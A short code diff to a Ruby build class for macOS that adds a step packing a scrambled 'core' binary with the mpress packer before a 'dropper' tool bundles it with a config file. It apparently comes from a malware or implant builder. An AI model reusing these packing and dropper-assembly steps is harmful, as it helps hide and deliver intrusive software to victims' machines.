@@ -44,7 +44,6 @@ class BuildOSX < Build
         raise "Working method marker not found"
       end
     end
-
   end
 
   def scramble
@@ -103,6 +102,8 @@ class BuildOSX < Build
         end
       end
     end
+
+    CrossPlatform.exec path('mpress'), "-ub " + path(@scrambled[:core])
 
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:config])+' '+
